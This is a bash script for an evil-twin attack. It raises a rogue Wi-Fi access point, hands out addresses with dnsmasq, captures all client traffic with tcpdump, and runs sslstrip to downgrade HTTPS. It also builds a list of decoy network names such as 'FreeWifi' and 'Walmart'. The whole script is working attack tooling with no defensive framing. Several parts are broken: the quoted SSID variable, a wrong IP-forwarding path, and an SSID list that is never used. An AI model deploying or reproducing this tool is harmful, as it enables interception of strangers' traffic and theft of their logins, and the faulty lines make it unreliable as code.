#!/bin/bash

# ================================
# Variables
# ================================
INTERFACE="wlan0"                   
MONITOR_INTERFACE="wlan0mon"        
FAKE_AP_SSID="totally normal wifi"             
INTERNET_INTERFACE="eth0"           
GATEWAY_IP="10.0.0.1"               
DHCP_RANGE_START="10.0.0.2"         
DHCP_RANGE_END="10.0.0.50"          
SUBNET="255.255.255.0"     
PCAP_FILE="/tmp/rogue_ap_traffic.pcap"
LOG_FILE="/tmp/rogue_ap_log.txt"
SSID_LIST="/tmp/ssid_list.txt"


# ================================
# Logging Function
# ================================
log_message() {
    echo "[+] $1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}


# ================================
# Error Handling
# ================================
handle_error() {
    echo "[-] Error: $1" | tee -a "$LOG_FILE"
    cleanup
    exit 1
}


# ================================
# Cleanup Function
# ================================
cleanup() {
    log_message "Cleaning up..."
    pkill airbase-ng 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill tcpdump 2>/dev/null
    pkill sslstrip 2>/dev/null
    pkill mdk3 2>/dev/null
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    ifconfig at0 down 2>/dev/null
    ifconfig $MONITOR_INTERFACE down 2>/dev/null
    airmon-ng stop $MONITOR_INTERFACE 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    log_message "AP stopped and network settings reset"
}


# ================================
# Enable Monitor Mode on Interface
# ================================
enable_monitor_mode() {
	log_message "Enabling monitor mode on $INTERFACE..."
	airmon-ng start $INTERFACE || handle_error "Failed to enable monitor mode"
	ifconfig $MONITOR_INTERFACE up || handle_error "Failed to bring up monitor interface"
}


# ================================
# Start Rogue Access Point
# ================================
start_rouge_ap() {
	log_message "Starting RAP with SSID: $FAKE_AP_SSID..."
	airbase-ng -e "FAKE_AP_SSID" -c 6 $MONITOR_INTERFACE > /dev/null 2>&1 &
	sleep 2
	if [ $? -ne 0 ]; then
		handle_error "Failed to start airbase-ng"
	fi
}


# ================================
# Configure Network Interface
# ================================
configure_network() {
	log_message "Configuring at0 with IP $GATEWAY_IP..."
	ifconfig at0 up
	ifconfig at0 $GATEWAY_IP netmask $SUBNET || handle_error "Failed to configure at0 interface"
}


# ================================
# Enable IP Forwarding and NAT
# ================================
enable_ip_forwarding() {
	log_message "Enabling IP forwarding and configuring NAT..."
	echo 1 > /proc/sys/net/ipv4/enable_ip_forward
	iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE
	iptables -A FORWARD -i at0 -o $INTERNET_INTERFACE -j ACCEPT
	iptables -A FORWARD -i $INTERNET_INTERFACE -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
}


# ================================
# Set up DHCP with dnsmasq
# ================================
start_dhcp() {
	log_message "Starting DHCP server..."
	dnsmasq --interface=at0 --dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,12h --no-resolv --log-facility=/tmp/dnsmasq.log 2>/dev/null &
	if [ $? -ne 0 ]; then
		handle_error "Failed to start dnsmasq"
	fi
}


# ================================
# Start Packet Capture
# ================================
start_packet_capture() {
	log_message "Starting packet capture on at0, saving to $PCAP_FILE..."
	tcpdump -i at0 -w "$PCAP_FILE" &
	if [ $? -ne 0 ]; then
		handle_error "Failed to start packet capture on at0"
	fi
}


# ================================
# Start sslstrip for HTTP Downgrade
# ================================
start_sslstrip() {
	log_message "Starting sslstrip (downgrade HTTPS)..."
	sslstrip -l 10000 &
	if [ $? -ne 0 ]; then
		handle_error "Failed to start sslstrip"
	fi

	#direct all HTTP traffic to sslstrip on port 10000
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
}


# ================================
# Multi-SSID Broadcast
# ================================
start_multi_ssid_broadcast() {
	echo "FreeWifi" > $SSID_LIST
    echo "PublicWiFi" >> $SSID_LIST
    echo "GuestNetwork" >> $SSID_LIST
    echo "Walmart" >> $SSID_LIST
    echo "ADX Florence" >> $SSID_LIST
    for i in {1..95}; do
        echo "FakeSSID_$i" >> $SSID_LIST
    done
}


# ================================
# Main
# ================================
log_message "Setting up RAP..."

enable_monitor_mode
start_rouge_ap
start_multi_ssid_broadcast
configure_network
enable_ip_forwarding
start_dhcp
start_packet_capture
start_sslstrip

trap cleanup SIGINT SIGTERM
log_message "RAP is active. Monitoring traffic on at0"
echo "Ctrl-C to block"

while true; do
	sleep 1
done